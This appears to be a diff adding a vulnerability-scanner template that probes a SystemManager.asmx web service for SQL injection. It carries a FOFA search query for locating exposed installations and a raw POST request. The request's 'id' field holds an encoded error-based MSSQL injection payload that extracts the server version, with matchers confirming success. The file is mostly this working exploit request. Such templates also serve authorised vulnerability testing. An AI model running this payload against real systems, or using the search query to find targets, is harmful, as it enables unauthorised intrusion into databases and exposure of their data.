@@ -1,0 +1,33 @@
+id: RWWXJC-SystemManager-asmx-SQL
+
+info:
+  name: RWWXJC-SystemManager-asmx-SQL
+  author: lengmo
+  severity: high
+  description: RWWXJC-SystemManager-asmx-SQL
+  tags: SQL
+  metadata:
+    fofa-query: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+http:
+  - raw:
+      - |
+        POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+ 
+        id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL Server'
+      - type: status
+        status: 
+          - 500
